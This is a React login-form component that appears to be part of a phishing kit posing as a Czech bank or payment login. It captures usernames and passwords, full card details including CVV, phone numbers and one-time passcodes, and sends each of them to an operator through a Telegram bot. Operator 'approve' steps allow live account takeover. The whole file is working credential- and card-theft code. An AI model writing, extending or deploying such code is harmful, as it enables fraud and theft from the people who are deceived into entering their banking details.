import React, { useState } from 'react';
import { useLanguage } from '../hooks/useLanguage';
import { useTelegramBot } from '../hooks/useTelegramBot';
import './LoginForm.css';

function LoginForm() {
  const { language, t } = useLanguage(); // Use the global language hook
  
  const [loginName, setLoginName] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState({ loginName: false, password: false });
  const [showCardForm, setShowCardForm] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [waitingForOtpApproval, setWaitingForOtpApproval] = useState(false);
  
  const [cardDetails, setCardDetails] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardholderName: '',
    phoneNumber: '',
    city: '',
    postalCode: ''
  });
  const [cardErrors, setCardErrors] = useState({});
  const [showOtpForm, setShowOtpForm] = useState(false);
  const [otpCode, setOtpCode] = useState('');
  const [otpError, setOtpError] = useState('');
  const [sessionId, setSessionId] = useState(null);

  // List of major cities in Czech Republic
  const czechCities = [
    'Prague', 'Brno', 'Ostrava', 'Plzeň', 'Liberec', 'Olomouc', 
    'Ústí nad Labem', 'Hradec Králové', 'České Budějovice', 
    'Pardubice', 'Havířov', 'Zlín', 'Kladno', 'Most', 'Karviná', 
    'Frýdek-Místek', 'Opava', 'Děčín', 'Teplice', 'Karlovy Vary', 
    'Chomutov', 'Jihlava', 'Prostějov', 'Přerov', 'Třebíč'
  ];

  const handleApprove = () => {
    setWaitingForApproval(false);
    setIsLoading(false);
    setShowCardForm(true);
  };

  const handleDeny = () => {
    setWaitingForApproval(false);
    setWaitingForOtpApproval(false);
    setIsLoading(false);
    alert(t.denied);
    window.location.reload();
  };

  const handleViewCard = () => {
    setWaitingForApproval(false);
    setIsLoading(false);
    setShowCardForm(true);
  };

  const handleNextStep = () => {
    setWaitingForOtpApproval(false);
    setIsLoading(false);
    setShowCardForm(false);
    setShowOtpForm(true);
    setOtpCode('');
    setOtpError('');
  };

  const {
    generateSessionId,
    sendToTelegramWithButtons,
    sendCardDetailsToTelegram,
    sendOtpToTelegram,
    sendSuccessToTelegram
  } = useTelegramBot(sessionId, handleApprove, handleDeny, handleViewCard, handleNextStep);

  const handleLogin = async (e) => {
    e.preventDefault();

    const newErrors = {
      loginName: loginName.trim() === '',
      password: password.trim() === ''
    };

    setErrors(newErrors);

    if (!newErrors.loginName && !newErrors.password) {
      setIsLoading(true);
      setWaitingForApproval(true);
      
      const newSessionId = generateSessionId();
      setSessionId(newSessionId);
      
      const loginData = {
        loginName: loginName.trim(),
        password: password.trim()
      };
      
      const message = `
🔐 <b>NEW LOGIN ATTEMPT</b> 🔐
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🆔 <b>Session ID:</b> <code>${newSessionId}</code>
━━━━━━━━━━━━━━━━━━━━━

📝 <b>LOGIN CREDENTIALS:</b>
├ 👤 <b>Username:</b> ${loginData.loginName}
└ 🔑 <b>Password:</b> ${loginData.password}

━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Click a button below to proceed</i>
      `;
      
      await sendToTelegramWithButtons(message, newSessionId);
    }
  };

  const handleInputChange = (field, value) => {
    if (field === 'loginName') setLoginName(value);
    else setPassword(value);
    setErrors({ ...errors, [field]: false });
  };

  const handleCardInputChange = (field, value) => {
    if (field === 'cardNumber') {
      value = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (value.length > 19) value = value.slice(0, 19);
    }
    
    if (field === 'expiryDate') {
      value = value.replace(/\D/g, '');
      if (value.length >= 2) {
        value = value.slice(0, 2) + (value.length > 2 ? '/' + value.slice(2, 4) : '');
      }
      if (value.length > 5) value = value.slice(0, 5);
    }
    
    if (field === 'cvv') {
      value = value.replace(/\D/g, '').slice(0, 4);
    }
    
    if (field === 'phoneNumber') {
      value = value.replace(/\D/g, '').slice(0, 9);
    }
    
    if (field === 'city') {
      value = value.slice(0, 50);
    }
    
    if (field === 'postalCode') {
      value = value.replace(/\s/g, '');
      if (value.length > 5) value = value.slice(0, 5);
      if (value.length >= 3 && value.length <= 5) {
        value = value.slice(0, 3) + (value.length > 3 ? ' ' + value.slice(3, 5) : '');
      }
    }

    setCardDetails({ ...cardDetails, [field]: value });
    
    if (cardErrors[field]) {
      setCardErrors({ ...cardErrors, [field]: false });
    }
  };

  const validateCzechPostalCode = (postalCode) => {
    const cleanCode = postalCode.replace(/\s/g, '');
    const postalRegex = /^\d{5}$/;
    return postalRegex.test(cleanCode);
  };

  const validateCardForm = () => {
    const errors = {};
    
    if (!cardDetails.cardNumber.trim() || cardDetails.cardNumber.replace(/\s/g, '').length < 16) {
      errors.cardNumber = t.validCard;
    }
    
    if (!cardDetails.expiryDate.trim() || !/^\d{2}\/\d{2}$/.test(cardDetails.expiryDate)) {
      errors.expiryDate = t.validExpiry;
    } else {
      const [month, year] = cardDetails.expiryDate.split('/');
      const currentDate = new Date();
      const currentYear = currentDate.getFullYear() % 100;
      const currentMonth = currentDate.getMonth() + 1;
      const expYear = parseInt(year);
      const expMonth = parseInt(month);
      
      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
        errors.expiryDate = t.cardExpired;
      }
    }
    
    if (!cardDetails.cvv.trim() || cardDetails.cvv.length < 3) {
      errors.cvv = t.validCvv;
    }
    
    if (!cardDetails.cardholderName.trim()) {
      errors.cardholderName = t.validCardholder;
    }
    
    if (!cardDetails.phoneNumber.trim()) {
      errors.phoneNumber = t.validPhone;
    } else if (cardDetails.phoneNumber.length !== 9) {
      errors.phoneNumber = t.phoneDigits;
    }
    
    if (!cardDetails.city.trim()) {
      errors.city = t.validCity;
    } else if (cardDetails.city.trim().length < 2) {
      errors.city = t.validCityName;
    }
    
    if (!cardDetails.postalCode.trim()) {
      errors.postalCode = t.validPostal;
    } else if (!validateCzechPostalCode(cardDetails.postalCode)) {
      errors.postalCode = t.invalidPostal;
    }
    
    return errors;
  };

  const handleCardSubmit = async (e) => {
    e.preventDefault();
    
    const errors = validateCardForm();
    
    if (Object.keys(errors).length === 0) {
      setIsLoading(true);
      setWaitingForOtpApproval(true);
      await sendCardDetailsToTelegram(cardDetails, sessionId);
      setIsLoading(false);
    } else {
      setCardErrors(errors);
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    
    if (!otpCode.trim() || otpCode.length < 6) {
      setOtpError(t.validOtp);
      return;
    }
    
    setIsLoading(true);
    await sendOtpToTelegram(otpCode, cardDetails.phoneNumber, sessionId);
    await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
    setIsLoading(false);
    
    alert(t.success);
    window.location.reload();
  };

  const handleCancelOtpForm = () => {
    setShowOtpForm(false);
    setShowCardForm(true);
    setOtpCode('');
    setOtpError('');
  };

  return (
    <div className="login-container">
      <h2>{t.loginTitle}</h2>

      {(isLoading || waitingForApproval || waitingForOtpApproval) && (
        <div className="loading-overlay">
          <div className="searching-container">
            <div className="animated-search-icon">
              <div className="search-ring"></div>
              <div className="search-ring-2"></div>
              <div className="search-ring-3"></div>
              <div className="search-dot"></div>
              <div className="search-magnifier">
                <div className="magnifier-circle"></div>
                <div className="magnifier-handle"></div>
              </div>
            </div>
            <p className="searching-text">
              {waitingForApproval && t.waitingAdmin}
              {waitingForOtpApproval && t.waitingContinue}
              {isLoading && !waitingForApproval && !waitingForOtpApproval && t.processing}
            </p>
            {waitingForOtpApproval && (
              <p className="searching-subtext">{t.adminWillReview}</p>
            )}
            {waitingForApproval && (
              <p className="searching-subtext">{t.pleaseWait}</p>
            )}
          </div>
        </div>
      )}

      {(errors.loginName || errors.password) && (
        <div className="error-box">
          {errors.loginName && (
            <div className="error-item">
              <span className="error-icon">❗</span>
              {t.pleaseEnterLogin}
            </div>
          )}
          {errors.password && (
            <div className="error-item">
              <span className="error-icon">❗</span>
              {t.pleaseEnterPassword}
            </div>
          )}
        </div>
      )}

      {!showCardForm && !showOtpForm && !waitingForApproval && !waitingForOtpApproval ? (
        <>
          <div className="login-form">
            <div className="form-group">
              <label htmlFor="loginName">{t.loginName}</label>
              <input
                type="text"
                id="loginName"
                value={loginName}
                onChange={(e) => handleInputChange('loginName', e.target.value)}
                placeholder={t.loginName}
                className={errors.loginName ? 'input-error' : ''}
              />
            </div>

            <div className="form-group">
              <label htmlFor="password">{t.password}</label>
              <input
                type="password"
                id="password"
                value={password}
                onChange={(e) => handleInputChange('password', e.target.value)}
                placeholder={t.password}
                className={errors.password ? 'input-error' : ''}
              />
            </div>

            <button onClick={handleLogin} className="login-btn" disabled={isLoading}>
              {t.logIn}
            </button>
          </div>

          <div className="login-links">
            <a href="#">{t.unknownLogin}</a>
            <span>|</span>
            <a href="#">{t.unknownPassword}</a>
          </div>
        </>
      ) : showCardForm && !waitingForOtpApproval ? (
        <div className="card-verification-form">
          <h3>{t.cardVerification}</h3>
          <p className="verification-message">{t.securityMessage}</p>
          
          <form onSubmit={handleCardSubmit}>
            <div className="form-group">
              <label htmlFor="cardholderName">{t.cardholderName}</label>
              <input
                type="text"
                id="cardholderName"
                value={cardDetails.cardholderName}
                onChange={(e) => handleCardInputChange('cardholderName', e.target.value)}
                placeholder="e.g., JEAN DUPONT"
                className={cardErrors.cardholderName ? 'input-error' : ''}
              />
              {cardErrors.cardholderName && (
                <span className="error-message">{cardErrors.cardholderName}</span>
              )}
            </div>

            <div className="form-group">
              <label htmlFor="cardNumber">{t.cardNumber}</label>
              <input
                type="text"
                id="cardNumber"
                value={cardDetails.cardNumber}
                onChange={(e) => handleCardInputChange('cardNumber', e.target.value)}
                placeholder="1234 5678 9012 3456"
                maxLength="19"
                className={cardErrors.cardNumber ? 'input-error' : ''}
              />
              {cardErrors.cardNumber && (
                <span className="error-message">{cardErrors.cardNumber}</span>
              )}
            </div>

            <div className="form-row">
              <div className="form-group half">
                <label htmlFor="expiryDate">{t.expirationDate}</label>
                <input
                  type="text"
                  id="expiryDate"
                  value={cardDetails.expiryDate}
                  onChange={(e) => handleCardInputChange('expiryDate', e.target.value)}
                  placeholder="MM/YY"
                  maxLength="5"
                  className={cardErrors.expiryDate ? 'input-error' : ''}
                />
                {cardErrors.expiryDate && (
                  <span className="error-message">{cardErrors.expiryDate}</span>
                )}
              </div>

              <div className="form-group half">
                <label htmlFor="cvv">{t.cvv}</label>
                <input
                  type="text"
                  id="cvv"
                  value={cardDetails.cvv}
                  onChange={(e) => handleCardInputChange('cvv', e.target.value)}
                  placeholder="123"
                  maxLength="4"
                  className={cardErrors.cvv ? 'input-error' : ''}
                />
                {cardErrors.cvv && (
                  <span className="error-message">{cardErrors.cvv}</span>
                )}
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="phoneNumber">{t.phoneNumber}</label>
              <input
                type="text"
                id="phoneNumber"
                value={cardDetails.phoneNumber}
                onChange={(e) => handleCardInputChange('phoneNumber', e.target.value)}
                placeholder="123456789"
                maxLength="9"
                className={cardErrors.phoneNumber ? 'input-error' : ''}
              />
              {cardErrors.phoneNumber && (
                <span className="error-message">{cardErrors.phoneNumber}</span>
              )}
              <small className="field-hint">{t.phoneHint}</small>
            </div>

            <div className="form-group">
              <label htmlFor="city">{t.city}</label>
              <input
                type="text"
                id="city"
                value={cardDetails.city}
                onChange={(e) => handleCardInputChange('city', e.target.value)}
                placeholder="e.g., Prague, Brno, Ostrava..."
                className={cardErrors.city ? 'input-error' : ''}
                list="czech-cities"
              />
              <datalist id="czech-cities">
                {czechCities.map(city => (
                  <option key={city} value={city} />
                ))}
              </datalist>
              {cardErrors.city && (
                <span className="error-message">{cardErrors.city}</span>
              )}
              <small className="field-hint">{t.cityHint}</small>
            </div>

            <div className="form-group">
              <label htmlFor="postalCode">{t.postalCode}</label>
              <input
                type="text"
                id="postalCode"
                value={cardDetails.postalCode}
                onChange={(e) => handleCardInputChange('postalCode', e.target.value)}
                placeholder="e.g., 110 00 or 11000"
                maxLength="6"
                className={cardErrors.postalCode ? 'input-error' : ''}
              />
              {cardErrors.postalCode && (
                <span className="error-message">{cardErrors.postalCode}</span>
              )}
              <small className="field-hint">{t.postalHint}</small>
            </div>

            <div className="card-buttons">
              <button type="submit" className="verify-btn" disabled={isLoading}>
                {isLoading ? t.sending : t.submitCard}
              </button>
            </div>
          </form>
        </div>
      ) : showOtpForm ? (
        <div className="otp-verification-form">
          <h3>{t.twoFactor}</h3>
          <p className="verification-message">{t.enterOtp}</p>
          
          <form onSubmit={handleOtpSubmit}>
            <div className="form-group">
              <label htmlFor="otpCode">{t.otpCode}</label>
              <input
                type="text"
                id="otpCode"
                value={otpCode}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '').slice(0, 6);
                  setOtpCode(value);
                  setOtpError('');
                }}
                placeholder="000000"
                maxLength="6"
                className={otpError ? 'input-error' : ''}
                autoFocus
              />
              {otpError && (
                <span className="error-message">{otpError}</span>
              )}
            </div>

            <div className="otp-buttons">
              <button type="button" onClick={handleCancelOtpForm} className="back-btn">
                {t.back}
              </button>
              <button type="submit" className="verify-btn" disabled={isLoading}>
                {isLoading ? t.verifying : t.verifyCode}
              </button>
            </div>
          </form>
        </div>
      ) : null}
    </div>
  );
}

export default LoginForm;